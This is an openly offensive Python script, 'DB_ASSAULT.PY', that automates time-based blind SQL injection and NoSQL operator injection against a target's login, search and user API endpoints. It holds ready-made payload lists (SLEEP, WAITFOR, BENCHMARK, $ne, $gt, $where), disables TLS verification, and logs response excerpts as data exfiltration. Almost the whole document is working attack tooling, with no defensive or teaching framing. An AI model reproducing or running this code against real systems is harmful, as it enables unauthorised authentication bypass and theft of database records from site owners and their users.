#!/usr/bin/env python3
"""
DB_ASSAULT.PY — Aggressive Database Exploitation & Time-Based Blind Injection Engine
Features:
- Real time-based blind SQL injection (SLEEP / BENCHMARK payload vectors)
- Boolean and error-based inference checks
- Advanced NoSQL operator injection ($ne, $gt, $where) with record collection
- Zero-disk live terminal streaming
"""
import asyncio
import http.client
import json
import ssl
import time
import sys
from urllib.parse import urlsplit, quote

REQUEST_TIMEOUT = 12
MAX_RESPONSE_SIZE = 128 * 1024

SQL_TIME_PAYLOADS = [
    "' OR SLEEP(5)-- -",
    "'; WAITFOR DELAY '0:0:5'-- -",
    "' AND (SELECT 9463 FROM(SELECT(SLEEP(5)))v)---",
    "1' AND BENCHMARK(50000000,MD5(1))-- -"
]

NOSQL_EXTRACTION_PAYLOADS = [
    {"username": {"$regex": "^.*$"}, "password": {"$ne": ""}},
    {"$where": "sleep(5)"},
    {"username": {"$gt": ""}, "password": {"$ne": None}}
]

def log(msg, color="\033[92m"):
    sys.stdout.write(f"{color}{msg}\033[0m\n")
    sys.stdout.flush()

def send_http(host, port, path, payload, secure, method="POST"):
    conn = None
    start = time.monotonic()
    try:
        if secure:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(host, port, timeout=REQUEST_TIMEOUT, context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=REQUEST_TIMEOUT)
            
        if isinstance(payload, dict):
            body = json.dumps(payload).encode("utf-8")
            ct = "application/json"
        else:
            body = str(payload).encode("utf-8")
            ct = "application/x-www-form-urlencoded"
            
        headers = {
            "User-Agent": "BruteDog-AggressiveDB/5.3",
            "Content-Type": ct,
            "Accept": "*/*",
            "Connection": "close"
        }
        conn.request(method, path, body=body, headers=headers)
        res = conn.getresponse()
        data = res.read(MAX_RESPONSE_SIZE).decode("utf-8", errors="replace")
        elapsed = round(time.monotonic() - start, 3)
        return {"status": res.status, "body": data, "elapsed": elapsed, "error": None}
    except Exception as exc:
        elapsed = round(time.monotonic() - start, 3)
        return {"status": 0, "body": "", "elapsed": elapsed, "error": str(exc)}
    finally:
        if conn:
            conn.close()

async def run_nosql_assault(target_host, port=None, use_ssl=None):
    log("\n[***] INITIALIZING AGGRESSIVE DATABASE ASSAULT & BLIND INJECTION [***]", "\033[95m")
    parsed = urlsplit(target_host if "://" in target_host else f"https://{target_host}")
    host = parsed.hostname
    secure = parsed.scheme == "https"
    target_port = port or parsed.port or (443 if secure else 80)
    base_path = parsed.path.rstrip("/")
    
    findings = []
    test_endpoints = [base_path + "/api/login", base_path + "/login", base_path + "/api/search", base_path + "/api/v1/users"]

    for endpoint in test_endpoints:
        log(f"[*] Testing aggressive vectors against: {endpoint}", "\033[94m")
        
        # 1. Time-Based Blind SQLi Assault
        for payload in SQL_TIME_PAYLOADS:
            res = send_http(host, target_port, endpoint, {"username": payload, "password": "password"}, secure)
            if res["elapsed"] >= 4.5:
                log(f"[!] TIME-BASED BLIND SQLi CONFIRMED [{endpoint}] (Delay: {res['elapsed']}s)", "\033[91m")
                findings.append({"vector": "Time-Based Blind SQLi", "endpoint": endpoint, "payload": payload, "delay": res["elapsed"]})

        # 2. NoSQL Operator & Extraction Assault
        for payload in NOSQL_EXTRACTION_PAYLOADS:
            res = send_http(host, target_port, endpoint, payload, secure)
            if res["status"] in (200, 201) and len(res["body"]) > 50:
                log(f"[+] NoSQL BYPASS / DATA EXFILTRATION TRIGGERED [{endpoint}]", "\033[92m")
                log(f"  └── Response Excerpt: {res['body'][:150]}", "\033[96m")
                findings.append({"vector": "NoSQL Operator Injection", "endpoint": endpoint, "payload": payload, "response_sample": res["body"][:100]})

    log(f"[+] Database assault complete. Total confirmed vectors: {len(findings)}", "\033[92m")
    return findings

